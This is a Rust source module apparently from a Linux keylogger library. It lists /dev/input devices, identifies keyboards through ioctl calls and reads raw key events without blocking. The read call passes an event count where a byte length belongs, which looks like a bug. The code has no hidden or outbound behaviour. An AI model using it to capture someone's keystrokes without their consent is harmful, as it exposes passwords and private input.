use crate::keyboard::{KeyEvent, Keyboard};
use crate::keylogger::KeyloggerResult;
use std::convert::TryFrom;
use std::fs::{self, File};
use std::io;
use std::os::fd::{AsRawFd, RawFd};
use std::os::unix::fs::FileTypeExt;
use std::path::PathBuf;

const _IOC_NRBITS: libc::c_ulong = 8;
const _IOC_TYPEBITS: libc::c_ulong = 8;
const _IOC_SIZEBITS: libc::c_ulong = 14;
const _IOC_NRSHIFT: libc::c_ulong = 0;
const _IOC_TYPESHIFT: libc::c_ulong = _IOC_NRSHIFT + _IOC_NRBITS;
const _IOC_SIZESHIFT: libc::c_ulong = _IOC_TYPESHIFT + _IOC_TYPEBITS;
const _IOC_DIRSHIFT: libc::c_ulong = _IOC_SIZESHIFT + _IOC_SIZEBITS;
const _IOC_READ: libc::c_ulong = 2;

pub(crate) fn read_key_events(fd: RawFd) -> io::Result<Vec<KeyEvent>> {
    const MAX_INPUT_EV: usize = 128;

    let default_event = libc::input_event {
        time: libc::timeval {
            tv_sec: 0,
            tv_usec: 0,
        },
        type_: 0,
        code: 0,
        value: 0,
    };
    let mut input_events = [default_event; MAX_INPUT_EV];

    let n = unsafe { libc::read(fd, input_events.as_mut_ptr() as *mut _, MAX_INPUT_EV) };

    if n < 0 {
        return Err(io::Error::last_os_error());
    }

    let n = (n as usize) / std::mem::size_of::<libc::input_event>();
    Ok(input_events[..n]
        .iter()
        .filter_map(|e| KeyEvent::try_from(e).ok())
        .collect())
}

/// Find all available keyboard devices.
pub(crate) fn find_keyboard_devices() -> KeyloggerResult<impl Iterator<Item = Keyboard>> {
    Ok(find_char_devices()?.filter_map(|entry| Keyboard::try_from(entry).ok()))
}

pub(crate) fn read_name(f: &File) -> KeyloggerResult<String> {
    const DEVICE_NAME_MAX_LEN: usize = 512;

    let mut device_name = [0u8; DEVICE_NAME_MAX_LEN];

    let eviocgname = (_IOC_READ << _IOC_DIRSHIFT)
        | (('E' as libc::c_ulong) << _IOC_TYPESHIFT)
        | (0x06 << _IOC_NRSHIFT)
        | ((device_name.len() as libc::c_ulong) << _IOC_SIZESHIFT);

    ioctl(
        f.as_raw_fd(),
        eviocgname,
        device_name.as_mut_ptr() as *mut libc::c_ulong,
    )?;

    Ok(String::from_utf8_lossy(&device_name).into())
}

pub(crate) fn read_event_flags(f: &File) -> KeyloggerResult<libc::c_ulong> {
    let mut ev_flags: libc::c_ulong = 0;

    let eviocgbit = (_IOC_READ << _IOC_DIRSHIFT)
        | (('E' as libc::c_ulong) << _IOC_TYPESHIFT)
        | (0x20 << _IOC_NRSHIFT)
        | (((std::mem::size_of::<libc::c_ulong>()) as libc::c_ulong) << _IOC_SIZESHIFT);

    ioctl(
        f.as_raw_fd(),
        eviocgbit,
        (&mut ev_flags) as *mut libc::c_ulong,
    )?;

    Ok(ev_flags)
}

/// Set the `O_NONBLOCK` flag for the specified file descriptor.
pub(crate) fn set_nonblocking(f: &File) -> KeyloggerResult<()> {
    let res = unsafe { libc::fcntl(f.as_raw_fd(), libc::F_SETFL, libc::O_NONBLOCK) };

    if res < 0 {
        return Err(io::Error::last_os_error().into());
    }

    Ok(())
}

fn find_char_devices() -> KeyloggerResult<impl Iterator<Item = PathBuf>> {
    const INPUT_DIR: &str = "/dev/input";

    Ok(fs::read_dir(INPUT_DIR)?.filter_map(|entry| {
        let entry = entry.ok()?;
        let file_type = fs::metadata(entry.path()).ok()?.file_type();

        if file_type.is_char_device() {
            Some(entry.path())
        } else {
            None
        }
    }))
}

fn ioctl(fd: RawFd, request: libc::c_ulong, buf: *mut libc::c_ulong) -> KeyloggerResult<()> {
    let res = unsafe { libc::ioctl(fd, request, buf) };

    if res < 0 {
        Err(io::Error::last_os_error().into())
    } else {
        Ok(())
    }
}
